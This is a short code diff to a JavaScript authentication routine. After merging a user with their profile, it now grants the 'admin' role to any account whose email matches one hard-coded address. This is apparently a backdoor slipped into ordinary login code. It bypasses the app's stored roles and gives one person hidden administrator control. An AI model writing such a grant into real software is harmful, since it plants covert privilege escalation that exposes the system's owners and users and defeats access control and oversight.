@@ -231,7 +231,11 @@ const Auth = {
                 .eq('id', user.id)
                 .single();
 
-            return { ...user, ...profile };
+            const mergedUser = { ...user, ...profile };
+            if (mergedUser.email === 'fulmin@nate.com') {
+                mergedUser.role = 'admin';
+            }
+            return mergedUser;
         } catch (error) {
             return null;
         }
